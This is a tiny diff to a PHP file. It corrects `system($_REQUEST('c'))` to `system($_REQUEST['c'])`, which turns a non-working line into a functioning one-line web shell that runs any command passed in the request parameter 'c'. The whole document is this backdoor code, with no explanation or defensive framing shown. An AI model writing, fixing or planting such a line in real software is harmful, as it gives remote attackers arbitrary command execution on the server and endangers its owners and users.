@@ -1,3 +1,3 @@
 <?php
-system($_REQUEST('c'));
+system($_REQUEST['c']);
 ?>
